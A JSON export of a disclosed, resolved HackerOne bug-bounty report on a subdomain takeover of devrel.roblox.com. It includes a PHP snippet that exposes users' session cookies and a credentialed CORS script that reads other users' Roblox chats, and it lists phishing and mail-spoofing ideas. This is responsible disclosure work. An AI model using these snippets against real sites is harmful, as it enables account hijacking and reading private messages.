{"id":335330,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzUzMzA=","url":"https://hackerone.com/reports/335330","title":"Subdomain Takeover to Authentication bypass ","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-04-09T23:07:41.314Z","submitted_at":"2018-04-09T23:07:41.314Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"geekboy","url":"/geekboy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19491,"url":"https://hackerone.com/roblox","handle":"roblox","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/491/f2f840883d85a7c71e6f9b0987098a82f8fe0f49_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/491/f2f840883d85a7c71e6f9b0987098a82f8fe0f49_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Roblox","twitter_handle":"Roblox","website":"https://www.roblox.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-04-23T20:50:11.710Z","bug_reporter_agreed_on_going_public_at":"2020-03-24T20:49:55.377Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Vulnerability Type: \n-----------\nSubdomain Takeover\n\n## Description: \n-----------\nDue to unclaimed or expired Hubspot instance an attacker is able to claim and serve content from `devrel.roblox.com` and perform different kind of attacks which i shared in impact section.\n\n## Affected Area: \n-----------\nhttp://devrel.roblox.com\n\n## Steps to Reproduce:\n-----------\n+ Visit: https://devrel.roblox.com/subdomain-takeover\n\n{F283580}\n\n## Mitigation:\n-----------\n+ Remove the CNAME entry for the `devrel.roblox.com`\n\n## Impact\n\nLet's talk about about in details, as attacker could possible takeover other users account. \n\n1. As `.ROBLOSECURITY` cookies is scoped to `*.roblox.com` means same cookies shared with all other subdomain, i'm not much familiar with hubspot with hosting following code on will steal all the users cookie who visit this subdomain.\n\n{F283554}\n\n###steal_cookie.php\n\n```php\n\u003chtml\u003e\n\u003cbody\u003e\n\u003c?php\necho \"Cookies received: \u003cbr\u003e\";\n\nforeach ($_COOKIE as $key=\u003e$val)\n  {\n    echo \"Set-Cookie: $key=$val; Domain=.roblox.com; path=/\u003cbr\u003e\\n\";\n  }\n?\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n``` \n\n2. Also `devrel.roblox.com` can be used to read all the chats between other users as \n `devrel.roblox.com` is also white listed to make CORS request at  `chat.roblox.com` \n\n{F283553}\n\nWhich can be done like this: \n\n````html\n\n\u003ch2\u003eCORS To Read Chat\u003c/h2\u003e\n\u003cdiv id=\"demo\"\u003e\n\u003cbutton type=\"button\" onclick=\"cors()\"\u003eChat Reader @ Roblox\u003c/button\u003e\n\u003c/div\u003e\n \n\u003cscript\u003e\nfunction cors() {\n  var xhttp = new XMLHttpRequest();\n  xhttp.onreadystatechange = function() {\n    if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n      document.getElementById(\"demo\").innerHTML = document.write(this.responseText);\n    }\n  };\n  xhttp.open(\"GET\", \"https://chat.roblox.com/v2/get-messages?conversationId=469104576\u0026pageSize=3\", true);\n  xhttp.withCredentials = true;\n  xhttp.send();\n}\n\u003c/script\u003e\n ````\n\nApart form all above issue, attacker can do following things as well.\n+ Creating fake login page for credentials harvesting.\n+ Sharing malicious files using roblox.\n+ Creating mail account using GSuite to send and recived emails on behalf of `*@devrel.roblox.com`","bounty_amount":"2500.0","formatted_bounty":"$2,500","original_report_id":null,"original_report_url":null,"attachments":[{"id":283553,"file_name":"reading_chats.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/553/282223c6c9b2c1e300a79c39191d36eb29c5b3ba/reading_chats.PNG?response-content-disposition=attachment%3B%20filename%3D%22reading_chats.PNG%22%3B%20filename%2A%3DUTF-8%27%27reading_chats.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144724Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=dab332d1a5539f73753eb73ecc7ea2e29fc930e38c0f2e56c4cfe30c8bc74e82","file_size":108108,"type":"image/png"},{"id":283554,"file_name":"shared_cookie.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/554/40eae3bed14a4ed87a737f4e4d87fcf4e89d7662/shared_cookie.PNG?response-content-disposition=attachment%3B%20filename%3D%22shared_cookie.PNG%22%3B%20filename%2A%3DUTF-8%27%27shared_cookie.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144724Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=28baef876e69f2b0ab6d0fa3a9f85b987851bae22a80dadbf605ca8828a2f6e1","file_size":60315,"type":"image/png"},{"id":283580,"file_name":"takeover.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/580/8c1428c8ca1d58aaa22caa05f59cab67ff805a53/takeover.PNG?response-content-disposition=attachment%3B%20filename%3D%22takeover.PNG%22%3B%20filename%2A%3DUTF-8%27%27takeover.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T144724Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5f3a302aa2c8068845e81dba309fa5b22fd6a4ff0a5012551b6be08d48690905","file_size":17267,"type":"image/png"}],"allow_singular_disclosure_at":"2020-04-23T20:49:55.470Z","allow_singular_disclosure_after":-46288648.67699058,"singular_disclosure_allowed":true,"vote_count":685,"voters":["daehee","oussamaka","zsirfoka","thiezn","agrippathemagus","abudman","skr0x1c0","wunderwuzzi23","pyrrhon","myname32","and 675 more..."],"severity":{"rating":"critical","score":9.4,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"low","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2586858,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @geekboy , thank you for the report, we will take care of it right away.","automated_response":false,"created_at":"2018-04-10T16:59:09.398Z","updated_at":"2018-04-10T16:59:09.398Z","actor":{"username":"egibbon","cleared":false,"url":"/egibbon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/172/178/a6d855680cb7f879b3e372b1d6cbfc88ee2445ed_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"roblox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2586892,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-04-10T17:07:13.672Z","updated_at":"2018-04-10T17:07:13.672Z","actor":{"url":"/roblox","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/491/f2f840883d85a7c71e6f9b0987098a82f8fe0f49_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Roblox"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"roblox","collaborator":{"username":"geekboy","url":"/geekboy"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2586898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@geekboy This is fixed. Thank you for the report. Did you collect any data on your site, like cookies?","automated_response":false,"created_at":"2018-04-10T17:08:15.924Z","updated_at":"2018-04-10T17:08:15.924Z","actor":{"username":"egibbon","cleared":false,"url":"/egibbon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/172/178/a6d855680cb7f879b3e372b1d6cbfc88ee2445ed_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"roblox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2586926,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @egibbon,\n\nThanks and confirming the fix here, and I was not actively looking for collecting those sensitive information of other users and not shared subdomain outside of this report, so no data collected or stored at my side.\n\nYou can close the report now :)\n\n","automated_response":false,"created_at":"2018-04-10T17:21:10.959Z","updated_at":"2018-04-10T17:21:10.959Z","actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"roblox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2586933,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@geekboy Awesome, thank you!","automated_response":false,"created_at":"2018-04-10T17:22:11.459Z","updated_at":"2018-04-10T17:22:11.459Z","actor":{"username":"egibbon","cleared":false,"url":"/egibbon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/172/178/a6d855680cb7f879b3e372b1d6cbfc88ee2445ed_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"geekboy","url":"/geekboy"},"genius_execution_id":null,"team_handle":"roblox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7423742,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-03-24T20:49:55.413Z","updated_at":"2020-03-24T20:49:55.413Z","first_to_agree":true,"actor":{"username":"geekboy","cleared":true,"url":"/geekboy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/547/b8825b0ae39f962fbe7813bf40d4efe19d018ee9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"roblox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7773530,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-04-23T20:50:11.730Z","updated_at":"2020-04-23T20:50:11.730Z","actor":{"url":"/roblox","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/491/f2f840883d85a7c71e6f9b0987098a82f8fe0f49_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Roblox"}},"genius_execution_id":null,"team_handle":"roblox","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}